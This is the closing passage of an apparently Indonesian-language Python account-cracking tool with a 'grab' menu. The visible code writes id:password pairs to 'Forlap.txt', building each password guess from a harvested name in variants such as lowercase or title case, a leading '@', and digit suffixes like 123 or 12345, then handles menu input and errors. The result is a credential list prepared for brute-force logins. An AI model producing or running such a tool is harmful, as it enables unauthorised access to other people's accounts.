                  with open('Forlap.txt','a') as o_:
                    o_.write(__+':'+__+'\n')
                    o_.write(__+':'+x[0].lower()+'\n')
                    o_.write(__+':'+x[0].title()+'\n')
                    o_.write(__+':@'+x[0].lower()+'\n')
                    o_.write(__+':@'+x[0].title()+'\n')
                    o_.write(__+':'+x[0].lower()+'123\n')
                    o_.write(__+':'+x[0].title()+'123\n')
                    o_.write(__+':@'+x[0].lower()+'123\n')
                    o_.write(__+':@'+x[0].title()+'123\n')
                    o_.write(__+':'+x[0].lower()+'1234\n')
                    o_.write(__+':'+x[0].title()+'1234\n')
                    o_.write(__+':@'+x[0].lower()+'1234\n')
                    o_.write(__+':@'+x[0].title()+'1234\n')
                    o_.write(__+':'+x[0].lower()+'1235\n')
                    o_.write(__+':'+x[0].title()+'12345\n')
                    o_.write(__+':@'+x[0].lower()+'1235\n')
                    o_.write(__+':@'+x[0].title()+'12345\n')
                    o_.write(__+':'+x[0].lower()+'12356\n')
                    o_.write(__+':'+x[0].title()+'123456\n')
                    o_.write(__+':@'+x[0].lower()+'12356\n')
                    o_.write(__+':@'+x[0].title()+'123456\n')
                    o_.write(__+':'+x[0].lower()+'123567\n')
                    o_.write(__+':'+x[0].title()+'1234567\n')
                    o_.write(__+':@'+x[0].lower()+'123567\n')
                    o_.write(__+':@'+x[0].title()+'1234567\n')
                    o_.write(__+':'+x[0].lower()+'1235678\n')
                    o_.write(__+':'+x[0].title()+'12345678\n')
                    o_.write(__+':@'+x[0].lower()+'1235678\n')
                    o_.write(__+':@'+x[0].title()+'12345678\n')
            doneGrab()
          elif Pilih_MenuGrab == '0':
            mm()
          elif Pilih_MenuGrab == 'x':
            exitst()
          else:
            print(f'{NC}•    {R}Kesalahan Input{NC}..!!')
            sleep(1)
            mm()
        elif Pilih_MainMenu == 'x':
          exitst()
        else:
          print(f'{NC}•    {R}Kesalahan Input{NC}..!!')
          sleep(1)
          mm()
    except KeyboardInterrupt:
      exit(f'{NC}\n•    {R}Keyboard Interupted{NC}..!!')
    except FileNotFoundError:
      print(f'{NC}•    {Y}ERROR {NC}=> {R}File Tidak Ditemukan{NC}..!!')
      sleep(1)
      mm()
    except IndexError:
      print(f'{NC}•    {R}Pastikan Jaringan Stabil{NC}..!!')
      sleep(1)
      mm()
  
  if __name__ == '__main__':
      mm()
        
       
        
        
       
     

